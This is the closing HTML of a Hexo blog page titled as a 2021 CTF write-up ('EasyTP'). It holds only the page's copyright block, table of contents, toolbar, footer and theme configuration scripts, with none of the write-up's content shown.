</div><div class="post-reward"><div class="post-reward-btn" title="Reward The Author"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">Credits</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">This work is published by John Doe at 2025-07-07 12:47:27</div><div class="post-copyright-link"><span>Link: <a href="http://example.com/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/">[çº¢æ˜è°·CTF_2021]EasyTP</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/">Copy</button></div><div class="post-copyright-detail">This work is licensed under <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a>. Please indicate <a href='/'>Meiçš„å°çª</a> when reprinting.</div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>Table Of Content</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP"><span class="toc-list-text">[çº¢æ˜è°·CTF_2021]EasyTP</span></a></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="Dark Mode" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="Share" type="button" data-text="http://example.com/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="Increase Font Size" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="Decrease Font Size" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="Settings" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="Table Of Content" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="Go To Top" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div></main><footer><div class="footer"><div id="footer-copyright">Â© 2024 - 2025 <span>ğŸ’—</span> <a href="/null">John Doe</a></div><div id="footer-info"><div id="footer-framework">ğŸš€Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a></div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">ğŸŒ»Blog Runtime: . Years . Months . Days</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
  root: '/',
  toolbar: true,
  lazyload_src: '/assets/images/Meow-Loading.webp',
  friends: false,
  codeblock: true,
  share_text: 'ğŸ±Share From Meow',
  onblur_title: 'Please Come Backï½âœ§(Â´â–½`Êƒâ™¡Æª)',
  mouse_click: false,
  notify:{
    enable: false,
    info: 'Copied successfully! Please mark the address of this post if redistribute.',
    f12_info: 'Turned on developer mode, please follow the copyright license of this website'
  },
  search: {
    enable: false,
    path: '',
    local: {
      top_n_per_article: 1,
      preload: false
    }
  },
  encrypt: false,
};
</script><script>if (!localStorage.getItem('color-mode')) {
  localStorage.setItem('color-mode', 'light' || 'light');
}
document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
</script>
<script src="/js/theme/tools/utils.js"></script>

<script src="/js/plugins/dist/lazyload.min.js"></script>

<script src="/js/plugins/view-image.min.js"></script>
<script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/main.js" type="module"></script>
</div></body></html>